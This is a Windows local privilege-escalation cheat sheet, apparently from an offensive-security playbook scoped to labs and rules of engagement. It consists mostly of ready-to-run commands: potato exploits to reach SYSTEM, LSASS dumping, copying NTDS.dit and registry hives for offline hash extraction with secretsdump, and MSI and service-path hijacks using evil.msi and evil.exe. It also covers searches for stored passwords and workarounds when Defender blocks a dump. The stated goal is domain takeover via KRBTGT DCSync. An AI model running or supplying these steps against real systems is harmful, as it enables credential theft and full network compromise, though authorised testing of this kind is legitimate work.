# LOP — Windows local privilege escalation (senior)

You landed a shell as a low-priv user (`shells.md`) and need SYSTEM/local admin
**on this host** — for LSASS, SAM, a service cred, or SeBackup→NTDS. In AD you
often skip this entirely (ACL/ADCS/RBCD → DCSync never needs a shell). Reach here
only when the graph says the win is on the box.

Public tools only. Lab / RoE. Stage on-host binaries under `/root/tools` on Kali
and upload; do not pack crypters or drop C2.

## Triage first (60 seconds)

```
whoami /all                 # SIDs + PRIVILEGES — the whole game is here
whoami /priv
systeminfo                  # build → known-exploit gating
net user %USERNAME%
# automated, if RoE allows a binary drop:
winPEASx64.exe quiet fast   # or Seatbelt.exe -group=all
```

Read `whoami /priv` before anything. A single enabled privilege usually is the path.

## Token privileges → SYSTEM

| Privilege | Abuse | Tool |
| --- | --- | --- |
| SeImpersonate / SeAssignPrimaryToken | potato → SYSTEM (service accts, IIS/MSSQL) | `PrintSpoofer.exe -i -c cmd` / `GodPotato -cmd cmd` |
| SeBackupPrivilege (+SeRestore) | read any file → **offline NTDS/SAM** | `diskshadow` / `robocopy /b` + `reg save` |
| SeDebugPrivilege | dump LSASS | `procdump -ma lsass.exe` → `pypykatz`/lsassy on Kali |
| SeRestorePrivilege | write protected paths / service binaries | swap a service image, restart |
| SeTakeOwnership | own a SYSTEM file/registry key | takeown → replace |
| SeLoadDriver | load a vulnerable signed driver | last resort, lab only |

```
# SeImpersonate (most common on service accounts):
PrintSpoofer.exe -i -c "C:\Windows\System32\cmd.exe"
GodPotato.exe -cmd "cmd /c whoami"

# SeBackupPrivilege → NTDS offline (DC) — the Blackfield pattern:
diskshadow /s script.txt          # script: create shadow of C:, expose as drive
robocopy /b <shadow>\Windows\NTDS . ntds.dit
reg save HKLM\SYSTEM SYSTEM.hive
# then on Kali:
impacket-secretsdump -ntds ntds.dit -system SYSTEM.hive LOCAL
```

## Config / cred escalation (no privilege needed)

```
# AlwaysInstallElevated (both HKLM+HKCU = 1) → SYSTEM MSI
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
msiexec /quiet /qn /i evil.msi

# Unquoted service path / weak service ACL
wmic service get name,pathname,startmode | findstr /i /v '"'   # unquoted + space
# accesschk.exe -uwcqv <user> * ; sc config <svc> binPath= "C:\evil.exe"

# Stored creds
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Winlogon /v DefaultPassword
cmdkey /list ; runas /savecred
dir /s /b C:\*unattend* C:\*sysprep* web.config *.kdbx 2>nul
```

## Read this

- `whoami /priv` shows privileges even when **Disabled** — SeBackup/SeImpersonate
  are enabled on demand; treat listed-but-disabled as available.
- Service accounts (IIS `iis apppool\...`, `mssql$...`, gMSA) almost always hold
  **SeImpersonate** → potato → SYSTEM.
- Prefer **Kali-side lsassy** over on-host procdump when you have SMB admin
  (`shells.md` / `onhost.md`) — quieter and no upload.
- SeBackup on a **DC** = full NTDS without being DA. That's the takeover, not a step.

## Fail → next

| Symptom | Next |
| --- | --- |
| SeImpersonate but PrintSpoofer fails | GodPotato / EfsPotato (build-dependent); check the printer/RPC path |
| no interesting `/priv` | config paths: AlwaysInstallElevated, unquoted svc, stored creds |
| procdump blocked by Defender | comsvcs `MiniDump`, or lsassy from Kali; do not pack a crypter |
| SeBackup copy locked | use a shadow copy (`diskshadow`), not a live-file copy |
| binary drop not allowed (RoE) | living-off-the-land: `reg save`, `diskshadow`, `wmic`, `sc` only |

## Chain

Shell → `whoami /priv` → potato/SeBackup → SYSTEM → LSASS/SAM/NTDS →
`secretsdump` from Kali. On-host (`onhost.md`) covers Rubeus/Mimikatz once elevated.
LPE is a means to a cred, not the objective — the objective is DCSync of KRBTGT.
